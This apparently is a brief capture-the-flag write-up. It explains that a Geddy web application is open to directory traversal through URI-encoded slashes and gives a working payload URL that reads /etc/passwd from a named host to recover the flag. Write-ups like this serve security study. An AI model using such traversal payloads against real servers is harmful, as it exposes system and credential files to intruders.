A quick Google search revealed that a Geddy application is vulnerable to directory traversal by uri encoding
the slashes. As a result, we can view files on the filesystem by accessing

http://45.55.51.22:40000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

As it so happens, viewing /etc/passwd shows the flag
flag{2112_slappa_da_BASS}
